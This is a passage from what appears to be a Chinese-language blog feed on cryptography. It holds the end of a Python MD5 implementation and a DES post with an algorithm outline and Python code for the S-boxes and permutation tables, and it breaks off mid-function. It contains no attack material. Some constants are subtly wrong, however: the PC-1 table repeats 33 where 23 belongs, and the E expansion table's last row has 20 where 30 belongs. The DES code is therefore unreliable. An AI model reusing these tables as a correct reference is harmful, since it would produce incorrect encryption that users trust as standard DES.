C0)</span><br><span class="line">        D0 = sum32(D, D0)</span><br><span class="line"></span><br><span class="line">    digest = reversehex(A0)+reversehex(B0)+reversehex(C0)+reversehex(D0)    <span class="comment">#大小端转换输出摘要</span></span><br><span class="line">    <span class="keyword">return</span> digest</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    plaintext=input(<span class="string">"输入加密字符串: "</span>)</span><br><span class="line">    print(md5encrypt(plaintext))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;hash函数实现&quot;&gt;&lt;a href=&quot;#hash函数实现&quot; class=&quot;headerlink&quot; title=&quot;hash函数实现&quot;&gt;&lt;/a&gt;hash函数实现&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;update() 函数把字典参数 dict2 的 key/value(键/值) 
      
    
    </summary>
    
      <category term="crypto" scheme="http://yoursite.com/categories/crypto/"/>
    
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>DES实现</title>
    <link href="http://yoursite.com/2018/12/25/DES/"/>
    <id>http://yoursite.com/2018/12/25/DES/</id>
    <published>2018-12-24T16:00:00.000Z</published>
    <updated>2018-12-28T08:11:51.199Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DES思路"><a href="#DES思路" class="headerlink" title="DES思路"></a>DES思路</h1><p>1.首先输入64bit密钥<br>2.将64bit密钥经过PC-1盒变成56bit<br>3.将56bit分为C0和D0，分别28bit<br>4.将C0，D0分别循环移位，得到C1，D1<br>5.将C1，D1拼接，经过PC-2盒变成48bit子密钥key1<br>6.重复步骤4<br>7.生成16组子密钥<br>这里真实加密只用到56bit，后面会有文章借助一道DES题目细致讲解这个密钥编排<br>F函数</p><p>1.将输入的32bit的R经过E盒生成48bit<br>2.将该48bit值与子密钥异或<br>3.将异或后的值经过S盒置换，又变回32bit<br>4.将值经过P盒置换<br>5.将32bit值与L进行异或得到下一个R<br>加密程序</p><p>1.输入64bit明文<br>2.经过IP盒置换打乱生成str<br>3.将str分为L0和R0，分别32bit<br>4.以下重复15次：<br>5.将Ri经过F函数处理，再与Li异或，然后将值赋给R(i+1)<br>6.将Ri赋值给L(i+1)<br>7.最后一轮，直接将Ri赋给R(i+1),再将Ri经过F函数处理，再与Li异或，然后将值赋给L(i+1)<br>8.将L和R合并后经过逆IP盒，得到密文C</p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">s1 = [</span><br><span class="line">    [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]]</span><br><span class="line"></span><br><span class="line">s2 = [</span><br><span class="line">    [<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>],</span><br><span class="line">    [<span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>],</span><br><span class="line">    [<span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>]]</span><br><span class="line"></span><br><span class="line">s3 = [</span><br><span class="line">    [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>]]</span><br><span class="line"></span><br><span class="line">s4 = [</span><br><span class="line">    [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>],</span><br><span class="line">    [<span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">    [<span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>],</span><br><span class="line">    [<span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line">s5 = [</span><br><span class="line">    [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">    [<span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>]]</span><br><span class="line"></span><br><span class="line">s6 = [</span><br><span class="line">    [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>],</span><br><span class="line">    [<span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>]]</span><br><span class="line"></span><br><span class="line">s7 = [</span><br><span class="line">    [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">    [<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>]]</span><br><span class="line"></span><br><span class="line">s8 = [</span><br><span class="line">    [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">    [<span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]]</span><br><span class="line"></span><br><span class="line">ip = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">      <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">      <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">_ip = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">       <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">       <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">       <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">pc1=[<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">  <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">  <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">  <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">  <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">33</span>, <span class="number">15</span>,</span><br><span class="line">  <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">  <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">  <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">pc2= [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">  <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">  <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">  <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>,</span><br><span class="line">  <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>,</span><br><span class="line">  <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line"></span><br><span class="line">e=[<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,</span><br><span class="line">   <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,</span><br><span class="line">   <span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,</span><br><span class="line">   <span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,</span><br><span class="line">   <span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,</span><br><span class="line">   <span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,</span><br><span class="line">   <span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,</span><br><span class="line">   <span class="number">28</span>,<span class="number">29</span>,<span class="number">20</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">p=[<span class="number">16</span>,<span class="number">7</span>,<span class="number">20</span>,<span class="number">21</span>,</span><br><span class="line">   <span class="number">29</span>,<span class="number">12</span>,<span class="number">28</span>,<span class="number">17</span>,</span><br><span class="line">   <span class="number">1</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">26</span>,</span><br><span class="line">   <span class="number">5</span>,<span class="number">18</span>,<span class="number">31</span>,<span class="number">10</span>,</span><br><span class="line">   <span class="number">2</span>,<span class="number">8</span>,<span class="number">24</span>,<span class="number">14</span>,</span><br><span class="line">   <span class="number">32</span>,<span class="number">27</span>,<span class="number">3</span>,<span class="number">9</span>,</span><br><span class="line">   <span class="number">19</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">6</span>,</span><br><span class="line">   <span class="number">22</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">S=[s1,s2,s3,s4,s5,s6,s7,s8]    <span class="comment">#S盒</span></span><br><span class="line">LS=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>]   <span class="comment">#迭代次数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(str)</span>:</span>       <span class="comment">#字符转二进制</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        temp=bin(ord(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        res+=temp</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(str1,str2)</span>:</span>     <span class="comment">#字符异或</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str1[i]==str2[i]:</span><br><span class="line">            res+=<span class="string">'0'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res+=<span 